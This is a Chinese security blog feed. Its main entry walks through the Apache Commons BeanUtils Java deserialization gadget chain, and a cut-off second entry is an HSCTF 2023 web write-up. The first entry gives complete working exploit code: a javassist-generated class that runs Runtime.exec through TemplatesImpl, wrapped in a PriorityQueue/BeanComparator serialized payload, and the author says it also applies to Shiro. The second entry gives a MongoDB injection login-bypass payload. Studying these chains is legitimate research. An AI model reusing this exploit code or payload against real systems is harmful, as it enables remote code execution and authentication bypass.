    <content type="html"><![CDATA[<p><a href="https://www.viewofthai.link/2022/04/17/apache-commons-beanutils-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90-%EF%BC%88cb%E9%93%BE%EF%BC%89-%E5%AD%A6%E4%B9%A0/">参考文章</a></p><p>最近就是想把不会的链子都跟一遍，现在就先打<code>cb</code>链入手</p><p><strong>全称</strong>(<code>Apache Commons BeanUtils</code>)</p><p>这个链子还可以用来打<code>shiro</code>无依赖的链子</p><p>这个类可以任意触发<code>getter</code>和<code>setter</code>方法</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20220416150822209.png" alt="img"></p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.xml.internal.ws.policy.sourcemodel.wspolicy.XmlToken.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person1, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618182435313.png" alt="image-20230618182435313"></p><p>成功触发</p><p><strong>先打个断点</strong></p><p><img src="../images/image-20230618182504133.png" alt="image-20230618182504133"></p><p>跟进<code>getProperty</code></p><p><img src="../images/image-20230618182536490.png" alt="image-20230618182536490"></p><p>接着跟进<code>getProperty</code></p><p><img src="../images/image-20230618182605765.png" alt="image-20230618182605765"></p><p>然后跟进<code>getNestedProperty</code></p><p><img src="../images/image-20230618183006965.png" alt="image-20230618183006965"></p><p>(<strong>前面的判断是判断bean是否是Map的实例和name是否被映射或索引了</strong>)</p><p>然后全不是</p><p>然后跟进<code>getSimpleProperty</code></p><p><img src="../images/image-20230618183254070.png" alt="image-20230618183254070"></p><p><img src="../images/image-20230618183329271.png" alt="image-20230618183329271"></p><p>然后经过这个<code>getPropertyDescriptor</code>方法</p><p>可以看到，我们传入的是 <code>name</code> ，这里返回 <code>Bean</code> 属性值是 <code>Name</code> ，并且 <code>set</code> 方法与 <code>get</code> 方法都是 <code>setName</code> , <code>getName</code> ，这是 <code>JavaBean</code> 的命名格式，会将传进来的小写<strong>首字母大写</strong></p><p>(<strong>这是一种特性  不能直接传大写的属性  这样的会报错</strong>)</p><p><img src="../images/image-20230618183809387.png" alt="image-20230618183809387"></p><p>接着跟进这个<code>invokeMethod</code>方法</p><p><img src="../images/image-20230618183841914.png" alt="image-20230618183841914"></p><p>最后就会在这个进行调用  </p><p>结束</p><p>这就是<code>cb</code>链调用任意<code>getter</code>的流程</p><p><strong>这里注意的一点就是</strong></p><p><img src="../images/image-20230618184101138.png" alt="image-20230618184101138"></p><p>在传参的时候，虽然函数名是大写的<code>Name</code>,我们也不能直接传大写的(<strong>这是java bean的特性</strong>)   <strong>他会在触发invoke的途中帮我们修改过来</strong></p><p>这就是他调用任意<code>getter</code>的过程</p><p><strong>那么我们可以猜想到哪条链子可以配这cb链来使用呢</strong></p><p>这里的话刚好有个类可以办到</p><p><strong>TemplatesImpl类-&gt;调用恶意类</strong>    <strong>就是这个类，最后会调用动态类加载来执行恶意代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><p>这里的<code>getOutputProperties</code>()刚好可以通过<code>cb</code>链来触发</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618195517461.png" alt="image-20230618195517461"></p><p>成功执行</p><p><strong>注意因为之前说的 <code>JavaBean</code> 特性， <code>OutputProperties</code> 首字母要小写</strong></p><p>接下来我们就得想办法看谁能触发这个了<code>PropertyUtils.getProperty</code></p><p> <code>BeanComparator.compare</code> 这个类刚好可以办到</p><p><img src="../images/image-20230618200112993.png" alt="image-20230618200112993"></p><p>并且<code>this.property</code>这个属性的值还可控</p><p><img src="../images/image-20230618200225030.png" alt="image-20230618200225030"></p><p><img src="../images/image-20230618200323289.png" alt="image-20230618200323289"></p><p><strong>那么最后一步就差个反序列化<code>readobject</code>()入口</strong>了   </p><p>就是找哪个类的<code>readobject</code>()方法能触发这个<code>compare</code>方法了</p><p>最后在以前的<code>cc4</code>利用链找到了</p><p><img src="../images/image-20230618200609016.png" alt="image-20230618200609016"></p><p>刚好在<code>PriorityQueue</code>这个类里的<code>readobject</code>()方法可以触发<code>compare</code>方法</p><p><img src="../images/image-20230618201614588.png" alt="image-20230618201614588"></p><p>并且这个<code>comparator</code>可控，所以传参为<code>BeanComparator</code>就行了</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  Object  <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(PropertyUtils.getProperty(templates, &quot;outputProperties&quot;));</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">outputProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        outputProperties.compare(templates,new TemplatesImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">ioTransformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(ioTransformingComparator);</span><br><span class="line">        <span class="comment">//这里是先给一个没啥用的comparator，为了避免在add的时候会执行</span></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//给queue数组传值</span></span><br><span class="line">        setValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, outputProperties);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618210616955.png" alt="image-20230618210616955"></p><p>这里的解释一下为啥要给<code>priorityQueue</code>的<code>comparator</code>二次赋值</p><p>因为在第二次<code>add</code>的时候</p><p><img src="../images/image-20230618210749196.png" alt="image-20230618210749196"></p><p>会调用到<code>add</code>里的<code>offer</code>方法里的<code>siftUp</code>方法</p><p><img src="../images/image-20230618210902066.png" alt="image-20230618210902066"></p><p>继续跟进，因为<code>comparator</code>不为空</p><p>所以跟进这个方法</p><p><img src="../images/image-20230618210920053.png" alt="image-20230618210920053"></p><p><strong>刚好，这也可以触发  所以为了避免这个问题  我们就在序列化的时候执行到这的时候先给一个没用的值，等这里执行结束的在利用反射重新赋值</strong></p><p><img src="../images/image-20230618211221232.png" alt="image-20230618211221232"></p><p>最后就是在这里来触发了</p><p><strong>结束</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.viewofthai.link/2022/04/17/apache-commons-beanutils-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90-%EF%BC%88</summary>
      
    
    
    
    
    <category term="java-Commons-BeanUtils" scheme="https://ke1nys.github.io/tags/java-Commons-BeanUtils/"/>
    
  </entry>
  
  <entry>
    <title>hsctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/f8ee282a.html"/>
    <id>https://ke1nys.github.io/posts/f8ee282a.html</id>
    <published>2023-06-16T12:11:25.000Z</published>
    <updated>2023-06-18T13:18:50.553Z</updated>
    
    <content type="html"><![CDATA[<p>这里的写这个wp的原因是这里有几道题考察的是<code>mongodb</code>的注入   </p><p>(<strong>之前没咋见过，都是做mysql的居多</strong>)  </p><p>之前见过一次还是在  <a href="https://ke1nys.github.io/posts/d27bfad9.html#d3node">d3ctf里面见过</a></p><p><a href="https://www.youtube.com/watch?v=QKZWyWQSPaw">youtube———-wp</a></p><h2 id="mogodb"><a href="#mogodb" class="headerlink" title="mogodb"></a>mogodb</h2><p>这是一个<code>mogodb</code>的查询语句  </p><p><img src="../images/image-20230616202249915.png" alt="image-20230616202249915"></p><p>注入点就在这了</p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; || this.user===&#x27;</span>a</span><br></pre></td></tr></table></figure><p>这里的引号位置是为了闭合代码中的引号</p><p>因为这里使用了<code>||</code>语句  ,所以说只要存在一个用户名为<code>admin</code>的用户，我们就能成功登录</p><p><strong>这里能成功是因为优先级的问题的</strong>              (<strong>非与或  优先级从大到小</strong>)</p><p>所以说这里会先执行<code>&amp;&amp;</code>   然后返回的结果在于<code>||</code>一起</p><h2 id="fancy-page"><a href="#fancy-page" class="headerlink" title="fancy-page"></a><strong>fancy-page</strong></h2><p>考点 <code>xss</code></p><p>这里很奇怪  (<strong>别的题目可以打通的payload到这就不行了，国外的题好奇怪</strong>)</p><p>而且还有一点就是不能使用国内的<code>vps</code>来弹shell     <strong>只能使用专门接http返回信息的网站来做</strong></p><p><strong>这里的话就记录一下他的payload，下次打国际赛在遇到的时候就拿出来用</strong></p><p><strong>给的源码中就下面的最有用</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">Arg</span> &#125; <span class="keyword">from</span> <span class="string">&quot;https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">content</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> content.<span class="title function_">replace</span>(<span class="regexp">/script|on|iframe|object|embed|cookie/gi</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> title = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">display</span>(<span class="params"></span>) &#123;</span><br><span class="line">title.<span class="property">textContent</span> = <span class="title class_">Arg</span>(<span 